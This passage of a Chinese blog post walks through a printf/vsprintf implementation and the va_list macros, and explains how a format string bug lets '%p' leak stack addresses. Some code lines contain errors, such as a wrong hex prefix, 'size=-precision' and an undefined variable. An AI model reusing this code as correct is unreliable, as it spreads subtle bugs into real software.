class="comment">//进制之间的相应转换</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> do_div(n,base)  (\</span></span><br><span class="line"><span class="meta">	__res=((unsigned long)n)%(unsigned)base,\</span></span><br><span class="line"><span class="meta">    n=((unsigned long)n)/(unsigned)base,\</span></span><br><span class="line"><span class="meta">    __res\</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="comment">/*测试printf函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp=<span class="number">10</span>;</span><br><span class="line">    println(<span class="string">&quot;%p\n&quot;</span>,tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    获取显示宽度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFieldWidth</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> **str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(**str))</span><br><span class="line">    len=len*<span class="number">10</span>+*((*str)++)-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> len ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    以特定的进制格式化输出字符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">number</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> num,<span class="keyword">int</span> base,<span class="keyword">int</span> size,<span class="keyword">int</span> precision,<span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c,sign,tmp[<span class="number">36</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *digits=<span class="string">&quot;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SMALL) digits=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;LEFT) type&amp;=~ZEROPAD;</span><br><span class="line">    <span class="keyword">if</span>(base&lt;<span class="number">2</span>||base&gt;<span class="number">36</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    c=(type&amp;ZEROPAD)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SIGN&amp;&amp;num&lt;<span class="number">0</span>)&#123;</span><br><span class="line">         sign=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">         num=-num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         sign=(type&amp;PLUS)?<span class="string">&#x27;+&#x27;</span>:((type&amp;SPACE)?<span class="string">&#x27; &#x27;</span>:<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sign)</span><br><span class="line">         size--;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SPECIAL)</span><br><span class="line">         <span class="keyword">if</span>(type==<span class="number">16</span>)</span><br><span class="line">             size-=<span class="number">2</span>;</span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span>(base==<span class="number">8</span>)</span><br><span class="line">             size--;</span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">        tmp[i++]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">while</span>(num!=<span class="number">0</span>)</span><br><span class="line">            tmp[i++]=digits[do_div(num,base)];</span><br><span class="line">    <span class="keyword">if</span>(i&gt;precision)</span><br><span class="line">        precision=i;</span><br><span class="line">    size=-precision;</span><br><span class="line">    <span class="keyword">if</span>(!(type&amp;(ZEROPAD+LEFT)))</span><br><span class="line">        <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)</span><br><span class="line">            *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(sign)</span><br><span class="line">        *str++=sign;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SPECIAL)</span><br><span class="line">        <span class="keyword">if</span>(base==<span class="number">8</span>)</span><br><span class="line">            *str++=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(base==<span class="number">16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">            *str++=digits[<span class="number">33</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!(type&amp;LEFT))</span><br><span class="line">        <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)</span><br><span class="line">            *str++=c;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;precision--)</span><br><span class="line">        *str++=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(i--&gt;<span class="number">0</span>)</span><br><span class="line">        *str++=tmp[i];</span><br><span class="line">    <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)</span><br><span class="line">        *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    打印输出函数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">const</span> <span class="keyword">char</span> *fmt,va_list args)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//printbuf(存储‘打印数据’的数组),fmt（格式化参数）,args（变参）</span></span><br><span class="line">    <span class="keyword">int</span> len,i,*ip,flags,field_width,precision,qualifier;</span><br><span class="line">    <span class="keyword">char</span> *str,*s;</span><br><span class="line">    <span class="keyword">for</span>(str=buf;*fmt;++fmt)<span class="comment">//str相当于buf</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*fmt!=<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++=*fmt;<span class="comment">//没有遇到&#x27;%&#x27;前，str先获取fmt，再累加</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*处理相关的标记*/</span></span><br><span class="line">        flags=<span class="number">0</span>;</span><br><span class="line">repeat:</span><br><span class="line">        ++fmt; <span class="comment">//跳过第一个%号</span></span><br><span class="line">        <span class="keyword">switch</span>(*fmt)</span><br><span class="line">        &#123;    </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                flags|=LEFT;</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                flags|=PLUS;</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                flags|=SPACE;</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                flags|=SPECIAL;</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                flags|=ZEROPAD;</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">        &#125;</span><br><span class="line">        field_width=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isdigit</span>(*fmt))</span><br><span class="line">            field_width=getFieldWidth(&amp;fmt);<span class="comment">//获取域宽</span></span><br><span class="line">        precision=<span class="number">-1</span>;<span class="comment">//获取精度</span></span><br><span class="line">        <span class="keyword">if</span>(*fmt==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++fmt;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isdigit</span>(*fmt))</span><br><span class="line">                precision=getFieldWidth(&amp;fmt);</span><br><span class="line">            <span class="keyword">if</span>(precision&lt;<span class="number">0</span>)</span><br><span class="line">                precision=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        qualifier=<span class="number">-1</span>;<span class="comment">//获取相应的修饰符</span></span><br><span class="line">        <span class="keyword">if</span>(*fmt==<span class="string">&#x27;H&#x27;</span>||*fmt==<span class="string">&#x27;L&#x27;</span>||*fmt==<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            qualifier=*fmt;</span><br><span class="line">            ++fmt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span>(*fmt)<span class="comment">//判断相应的格式串</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(!(flags&amp;LEFT))</span><br><span class="line">                <span class="keyword">while</span>(--field_width&gt;<span class="number">0</span>)</span><br><span class="line">                    *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            *str++=(<span class="keyword">unsigned</span> <span class="keyword">char</span>)va_arg(args,<span class="keyword">int</span>);<span class="comment">//将参数值存入printbuf里的</span></span><br><span class="line">            <span class="keyword">while</span>(--field_width&gt;<span class="number">0</span>)</span><br><span class="line">                *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s=va_arg(args,<span class="keyword">char</span> *);</span><br><span class="line">            len=<span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(precision&lt;<span class="number">0</span>)</span><br><span class="line">                precision=len;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len&gt;precision)</span><br><span class="line">                len=precision;</span><br><span class="line">            <span class="keyword">if</span>(!(flags&amp;LEFT))</span><br><span class="line">                <span class="keyword">while</span>(len&lt;field_width--)</span><br><span class="line">                    *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)</span><br><span class="line">                *str++=*s++;</span><br><span class="line">            <span class="keyword">while</span>(len&lt;field_width--)</span><br><span class="line">                *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: </span><br><span class="line">                str=number(str,va_arg(args,<span class="keyword">unsigned</span> <span class="keyword">long</span>),<span class="number">8</span>,field_width,precision,flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(field_width==<span class="number">-1</span>)&#123;</span><br><span class="line">                field_width=<span class="number">0</span>;</span><br><span class="line">                flags|=ZEROPAD;</span><br><span class="line">            &#125;</span><br><span class="line">            str=number(str,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)va_arg(args,<span class="keyword">void</span>*),<span class="number">16</span>,field_width,precision,flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            flags|=SMALL;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">            str=number(str,va_arg(args,<span class="keyword">unsigned</span> <span class="keyword">long</span>),<span class="number">16</span>,field_width,precision,flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            flags|=SIGN;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            str=number(str,va_arg(args,<span class="keyword">unsigned</span></span><br><span class="line"><span class="keyword">long</span>),<span class="number">10</span>,field_width,precision,flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            ip=va_arg(args,<span class="keyword">int</span> *);</span><br><span class="line">            *ip=(str-buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(*fmt!=<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">                *str++=<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(*fmt)</span><br><span class="line">                *str++=*fmt;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                --fmt;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *str=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> str-buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">可变函数在内部实现的过程中是从右向左压入堆栈，从而保证了可变参数的第一个参数始终位于栈顶</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">println</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list args;<span class="comment">//定义一个char类型的指针</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    va_start(args,fmt);</span><br><span class="line">    <span class="comment">//实际上可以理解为(char *)&amp;fmt+4指向了第一个参数（char*)&amp;fmt+8指向了第二个参数</span></span><br><span class="line">    write(STDOUT,printbuf,i=<span class="built_in">vsprintf</span>(printbuf,fmt,args));</span><br><span class="line">    <span class="comment">//将printbuf里的值写入标准输出</span></span><br><span class="line">    va_end(args);<span class="comment">//关闭函数参数列表，将参数置空（即args=NULL）</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>伪代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//va_start(arg,fmt),初始化参数指针arg，将函数参数fmt右边第一个参数地址赋值给arg</span></span><br><span class="line"><span class="comment">//fmt必须是一个参数的指针，所以，此种类型函数至少要有一个普通的参数</span></span><br><span class="line"><span class="comment">//从而提供给va_start ,这样va_start才能找到可变参数在栈上的位置</span></span><br><span class="line"><span class="comment">//va_arg(arg,char),获得arg指向参数的值，同时使arg指向下一个参数,char用来指名当前参数型</span></span><br><span class="line"><span class="comment">//va_end 在有些实现中可能会把arg改成无效值，这里，是把arg指针指向了 NULL,避免出现野指针 </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list arg;</span><br><span class="line">	va_start(arg, fmt);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span> (*format)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> ret = *fmt;</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span> (*++fmt)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">char</span> ch = va_arg(arg, <span class="keyword">char</span>);</span><br><span class="line">				<span class="built_in">putchar</span>(ch);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">char</span> *pc = va_arg(arg, <span class="keyword">char</span> *);</span><br><span class="line">				<span class="keyword">while</span> (*pc)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">putchar</span>(*pc);</span><br><span class="line">					pc++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">putchar</span>(*fmt);</span><br><span class="line">		&#125;</span><br><span class="line">		fmt++;</span><br><span class="line">	&#125;</span><br><span class="line">	va_end(arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>printf源码</strong>太复杂，但是网上有大佬把其中<strong>关键</strong>的部分提取了出来，编写出了相对简单的<strong>伪代码</strong></p>
<p>“printf”的<strong>执行过程</strong>主要依靠<strong>1个指针</strong>，<strong>3个函数</strong></p>
<p>指针：val_list arg</p>
<p>函数：va_start(arg, fmt)，va_arg(arg, type)，va_end(arg)</p>
<p>主要流程如下：</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639554313034.png" class width="1639554313034"> 
<p>根据流程，可以大致分析漏洞的成因了：</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639503859877.png" class width="1639503859877"> 
<p>假设正常的printf有3个变量：val1，val2，val3</p>
<p>它们所指向的内容分别为：buf1，buf2，buf3</p>
<p>正常的printf有3个变量在函数调用的过程中是会<strong>正常压栈</strong>的（如上图）</p>
<p>格式化参数中的3个“%”会调用3次“va_arg”函数，并且都<strong>只会</strong>对<strong>压在栈上</strong>的这3个参数进行操作</p>
<p>如果printf没有这3个参数，<strong>arg</strong>就会把栈中<strong>对应位置</strong>的内容<strong>错误识别</strong>为参数</p>
<p>因此这3个“va_arg”函数就会对<strong>对应位置</strong>的地址空间进行操作</p>
<p>格式化字符串漏洞，就是利用了<strong>arg</strong>的特性，使用“%p”获取<strong>指针类型</strong>来泄露地址</p>
<p>这就引发了一个问题：</p>
<p>函数va_start，va_arg，va_end中的<strong>参数</strong>都是一样的(<strong>arg</strong>)，为什么<strong>指向内容</strong>会变化呢？</p>
<p>并且<strong>arg</strong>似乎知道<strong>“格式化参数”</strong>的长度，可以准确指向其后的下一个变量</p>
<p>想要知道<strong>arg</strong>的成因，需要先有C语言<strong>宏</strong>的知识</p>
<hr>
<p><strong>宏</strong></p>
<p>宏是一种批量处理的称谓，计算机科学里的宏是一种<strong>抽象</strong> </p>
<p>即使用“标识符”来表示“替换列表”中的内容</p>
<p><strong>宏定义</strong></p>
<p>格式为：“#define 标识符 <strong>替换列表</strong>”</p>
<p>在预处理过程中，预处理器会把<strong>源程序</strong>中所有宏名，替换成<strong>宏定义</strong>中<strong>替换列表</strong>中的内容 </p>
<p><strong>宏函数</strong></p>
<p>格式为：“#define MAX(a,b) ((a)&lt;(b)?(b):(a))”（MAX为函数，其后为函数的内容）</p>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sqr(x) ((x)*(x))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d的平方是：%d\n&quot;</span>,n,sqr(n));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个实数：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lf的平方是：%lf\n&quot;</span>,n,sqr(n));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以发现：</p>
<p>int 类型(%d)和 double 类型(%lf) 都可以被<strong>宏函数</strong>“sqr(n)”计算</p>
<p>“sqr(n)”本身的参数“n”<strong>没有定义类型</strong>，并且“n”可以接受<strong>任何合理的类型</strong>的数据</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wit_732/article/details/106602503">https://blog.csdn.net/wit_732/article/details/106602503</a></p>
<p><strong>PS：“&amp;”脱去解引用</strong></p>
<p>我们都熟悉“&amp;”，知道它有获取变量地址的能力，但先看一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>; <span class="comment">//&amp;a = 0x0012ff60   </span></span><br><span class="line">    <span class="keyword">int</span> *p = &amp;*(<span class="keyword">int</span>*)<span class="number">0x0012ff60</span>;     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value is: %d/n&quot;</span>, *p);     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>已知变量“a”的地址就是“0x0012ff60”，把“0x0012ff60”转换为(int<em>)类型，这时它和“&amp;a”是<em>*等价</em></em>的</p>
<p>“(int<em>)0x0012ff60 == &amp;a(变量a的<strong>地址</strong>)”，在其前面加上“ </em> ”，就代表变量a的<strong>内容</strong>（解引用）</p>
<p>最后在其前面加上“&amp;”，表示<strong>脱去解引用</strong> ，“&amp;<em>(int </em>)0x0012ff60 == &amp;a”</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zenny_chen/article/details/2512056">https://blog.csdn.net/zenny_chen/article/details/2512056</a></p>
<p><strong>PS：C语言中的“逗号”</strong></p>
<p>C语言中的逗号有两种意思：</p>
<p>1、表示”分隔号”的意思,就和语文中的逗号一个意思</p>
<p>2、表示”逗号运算符”的意思,用它将多个表达式连接起来：</p>
<p>先对左侧表达式求值，将结果丢弃，逗号运算符的真正结果是右侧表达式的值 </p>
<p>例如：“a = 3+5 , 6+8 ”（ 逗号表达式 ）</p>
<p>结果：“a = 14 ”</p>
<hr>
<h2 id="分析printf中的宏定义（32位）"><a href="#分析printf中的宏定义（32位）" class="headerlink" title="分析printf中的宏定义（32位）"></a>分析printf中的宏定义（32位）</h2><p>​        //64位的宏定义与32位有些许不同，后文会提到</p>
<p>我们的目的是了解为什么<strong>arg</strong>会<strong>自动获取</strong>下一个参数的位置，那么先看看<strong>arg</strong>是怎么来的</p>
<p>“va_list arg”中声明了arg</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *va_list;</span><br></pre></td></tr></table></figure>
<p>“typedef”为<strong>重定义</strong>，把“char *”重新命名为“va_list”，这里就是定义了一个char类型的指针</p>
<p>其后的：va_start，va_arg，va_end都是<strong>宏函数</strong>，arg作为它们的参数</p>
<p>而它们都属于<strong>VA_LIST</strong>：</p>
<p>VA_LIST 是在C语言中解决<strong>变参问题</strong>的<strong>一组宏</strong>（变参问题：参数的个数不定，类型也可以不同）</p>
<p>VA_LIST的用法： </p>
<p>1.首先在函数里定义一具<strong>VA_LIST</strong>型的变量，这个变量是指向参数的指针<br>2.然后用<strong>VA_START</strong>宏初始化变量刚定义的VA_LIST变量<br>3.然后用<strong>VA_ARG</strong>返回可变的参数，<strong>VA_ARG</strong>的第二个参数是你要返回的参数的类型<br>4.最后用<strong>VA_END</strong>宏结束可变参数的获取</p>
<p>为了理解这些<strong>宏函数</strong>（<strong>VA_LIST</strong>），先看一个案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *param1，<span class="keyword">char</span> *param2，<span class="keyword">char</span> *param3, <span class="keyword">char</span> *param4)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    va_list <span class="built_in">list</span>;</span><br><span class="line">    va_start(<span class="built_in">list</span>,param1);</span><br><span class="line">    va_arg(<span class="built_in">list</span>, <span class="keyword">char</span>);</span><br><span class="line">    <span class="keyword">return</span>; </span><br><span class="line">&#125;<span class="comment">//宏定义过程省略</span></span><br></pre></td></tr></table></figure>
<p>调用函数test，参数从右往左依次入栈，然后压上“返回地址”和“EBP”：</p>
<p><img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639559618139.png" width="250" height="325">  </p>
<p>调用函数 <strong>va_start(list,param1)</strong> 后：</p>
<p><img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639559874868.png" width="375" height="355">  </p>
<p>调用函数 <strong>va_arg(list, char)</strong> 后：</p>
<p><img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639560186765.png" width="375" height="355">  </p>
<p>结合“以上案例”和“以下宏函数的源码”，我们可以大致分析一下这些宏函数了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_round_size(TYPE) </span></span><br><span class="line">(((<span class="keyword">sizeof</span>(TYPE)+<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>))*<span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_start(AP,LASTARG)<span class="comment">//va_start</span></span></span><br><span 